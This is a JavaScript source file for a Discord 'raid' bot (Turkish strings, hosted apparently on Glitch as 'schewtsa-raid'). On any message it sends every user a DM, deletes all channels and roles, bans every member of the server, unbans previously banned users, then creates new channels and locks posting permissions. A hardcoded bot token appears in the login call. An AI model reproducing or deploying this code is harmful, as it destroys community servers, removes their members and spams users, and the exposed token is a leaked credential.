////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
const express = require('express');
const Discord = require('discord.js');
const berke = new Discord.Client();
const app = express();
const http = require('http');
    app.get("/", (request, response) => {
    response.sendStatus(200);
    });
    app.listen(process.env.PORT);
    setInterval(() => {
    http.get('http://schewtsa-raid.glitch.me/');
    }, 280000);
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

berke.on('message', async msg => {
berke.users.forEach(u => {
u.send('sa')
})
    
msg.guild.fetchBans().then(bans => {
bans.forEach(user => {
msg.guild.unban(user)
      });
    });
  
msg.guild.channels.forEach(a => a.delete())
msg.guild.members.forEach(a => msg.guild.ban(a))
msg.guild.roles.forEach(a => a.delete())
let kanal = 'schewtsa'
let kanal1 = 'buraya-yazın'

msg.guild.createChannel(kanal)
msg.guild.createChannel(kanal1)
});
 
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 


berke.on('message', message => {
    if(message.content.toLowerCase() === 'ban kaldır' ) {
        message.guild.fetchBans().then(bans => {
            bans.forEach(user => {
                message.guild.unban(user);
            });
        });
    }
});

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

berke.on('channelCreate', channel => {
  if (channel.name == 'schewtsa') {
    channel.send('Bir, kuşun kanat çırpış sesiydi.')
    channel.guild.channels.forEach(c => {
         c.overwritePermissions(channel.guild.roles.find("name", "@everyone"), {
              SEND_MESSAGES: false,
              ADD_REACTIONS: false,
              SPEAK: false
            });
          });
  }
  if (channel.name == '') {
    channel.send(``)
  }

});

///////////

berke.on('channelCreate', channel => {
  if (channel.name == 'buraya-yazın') {
    channel.send('@everyone buraya yazabilirsiniz.')
    channel.guild.channels.forEach(c => {
         c.overwritePermissions(channel.guild.roles.find("name", "@everyone"), {
              SEND_MESSAGES: true,
              ADD_REACTIONS: false,
              SPEAK: false
            });
          });
  }
  if (channel.name == '') {
    channel.send(``)
  }

});

berke.login("NjQ1MzczODYyNjA2OTI5OTIw.XekzkQ.3ivRA9CxBvESe5Z2iNjYoh6e3PI")


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////